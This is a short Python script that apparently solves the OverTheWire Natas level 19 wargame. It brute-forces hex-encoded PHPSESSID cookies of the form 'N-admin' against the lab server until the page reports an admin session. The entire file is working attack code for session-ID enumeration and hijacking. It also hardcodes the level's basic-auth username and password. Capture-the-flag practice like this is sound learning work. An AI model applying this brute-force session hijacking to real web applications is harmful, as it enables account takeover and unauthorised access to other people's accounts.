
import requests

url = "http://natas19.natas.labs.overthewire.org/"
auth = ("natas19","qvwtMqAcVSBlf7HE3sw9pljhqqPF9MMT")

for session_id in range(1,641):
    cookie = f'{session_id}-admin'
    encoded_cookie = cookie.encode().hex()
    cookies = {"PHPSESSID":encoded_cookie}

    r = requests.get(url=url,auth=auth,cookies=cookies)

    if "You are an admin" in r.text:
        print(f'The admin was found : {cookie}')
        print(r.text)
        break;
    else:
        print(f"Processing : {cookie}")
else:
    print("Admin not found in range 1 - 641")